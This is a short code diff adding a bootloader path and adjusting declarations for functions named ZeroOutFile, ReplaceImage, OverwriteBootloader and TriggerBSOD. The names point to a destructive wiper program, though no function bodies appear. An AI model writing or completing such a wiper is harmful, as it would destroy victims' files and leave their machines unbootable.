@@ -6,9 +6,10 @@
 
 #define BUFFER_SIZE 4096
 #define IMAGE_PATH "assets/image.jpg"
+#define BOOTLOADER_PATH "bootloader.bin"
 
-BOOL ZeroOutFile(char* filename);
-BOOL ReplaceImage(char* filename);
+BOOL ZeroOutFile(LPCWSTR filename);
+BOOL ReplaceImage(LPCWSTR filename);
 BOOL OverwriteBootloader();
 void TriggerBSOD();
 
